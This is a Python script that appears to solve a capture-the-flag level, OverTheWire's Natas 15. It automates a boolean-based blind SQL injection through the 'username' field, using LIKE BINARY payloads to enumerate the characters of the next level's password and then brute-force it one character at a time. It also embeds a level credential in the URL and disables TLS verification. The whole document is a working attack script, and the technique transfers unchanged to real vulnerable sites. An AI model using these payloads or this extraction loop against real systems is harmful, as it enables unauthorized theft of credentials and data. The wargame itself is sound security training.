#!/usr/bin/env python

import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
exist = ''
password = ''
target = 'http://natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx@natas15.natas.labs.overthewire.org/index.php'
trueStr = 'This user exists.'

# Step 1: Find characters that exist in the password
for x in chars:
    params = {
        'username': 'natas16" AND password LIKE BINARY "%{}%" "'.format(x)
    }
    r = requests.get(target, params=params, verify=False)
    if trueStr in r.text:
        exist += x
        print('Using: ' + exist)

print('All characters used. Starting brute force... Grab a coffee, might take a while!')

# Step 2: Brute force the password character by character
for i in range(32):
    found = False
    for c in exist:
        test_password = password + c
        params = {
            'username': 'natas16" AND password LIKE BINARY "{}%" "'.format(test_password)
        }
        r = requests.get(target, params=params, verify=False)
        if trueStr in r.text:
            password += c
            print('Password: ' + password + '*' * int(32 - len(password)))
            found = True
            break
    if not found:
        print('Password not found. Exiting...')
        break

print('Completed!')
